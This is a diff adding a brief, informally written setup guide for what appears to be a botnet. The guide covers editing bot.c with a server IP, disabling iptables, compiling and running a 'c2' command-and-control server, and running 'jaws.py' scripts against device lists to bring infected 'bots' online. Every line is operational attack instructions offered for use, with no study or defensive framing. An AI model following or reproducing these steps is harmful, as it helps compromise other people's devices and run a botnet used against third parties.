@@ -1,0 +1,19 @@
+edit the bot.c file with server, i already put bot port k8 you just needa put the vps ip in.
+yum update -y
+yum install httpd; yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+service httpd restart; service iptables stop
+sed -i s/1024/9999999/g /usr/include/bits/typesizes.h
+gcc c2.c -o c2 -pthread; rm -rf c2.c
+python compile.py bot.c theserverip
+screen ./c2 999 1 333
+k8 if that dont work do sudo screen ./c2 999 1 333
+logins are in users
+once you have connected and can see the bot number do the following commands
+cd jaws
+python3 jaws.py
+then do jaws1
+python3 jaws.py
+then do jaws2
+python3 jaws.py
+then do jaws3 
+then all your bots should be up if not ill add some list of not dead bots 
